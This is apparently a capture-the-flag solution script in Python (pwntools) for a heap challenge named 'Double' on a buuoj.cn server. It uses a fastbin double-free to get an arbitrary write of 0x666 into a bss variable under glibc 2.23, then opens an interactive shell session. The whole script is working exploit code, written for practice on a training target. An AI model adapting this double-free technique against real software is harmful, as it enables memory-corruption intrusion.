'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

$ patchelf ./Double --set-interpreter /home/fa1c4/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so --set-rpath /home/fa1c4/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64

Double Free | fastbin attack to any-addr write, fulfill dword_602070 == 0x666
libc-2.23 will check the head chunk's fd == freeing chunk's fd, so cant double free directly
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "29136" 
filename = "./Double"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

bss_addr = 0x0000000000602070 - 0x10

def B():
    gdb.attach(io)
    pause()

def mAdd(content, idx):
    io.sendlineafter(b'>\n', b'1')
    io.sendlineafter(b'Input idx\n', str(idx).encode())
    io.sendlineafter(b'Input content\n', content)

def mDel(idx):
    io.sendlineafter(b'>\n', b'2')
    io.sendlineafter(b'Input idx\n', str(idx).encode())

def mCheck():
    io.sendlineafter(b'>\n', b'3')

def pwn():
    '''
    add chunk0 add chunk1,
    free chunk0, free chunk1, free chunk0
    add chunk2(chunk0) to modify chunk0's fd to bss_addr
    add chunk3(bss addr) to modify bss_addr to 0x666
    '''
    mAdd(b'0xfa1c4', 0)
    mAdd(b'0xfa1c4', 1)
    
    mDel(0)
    mDel(1)
    mDel(0)

    mAdd(p64(bss_addr), 0)
    # B()
    mAdd(b'0xfa1c4', 1)
    mAdd(b'0xfa1c4', 2)
    mAdd(p64(0x666), 3)
    
    mCheck()


if __name__ == "__main__":
    pwn()
    io.interactive()
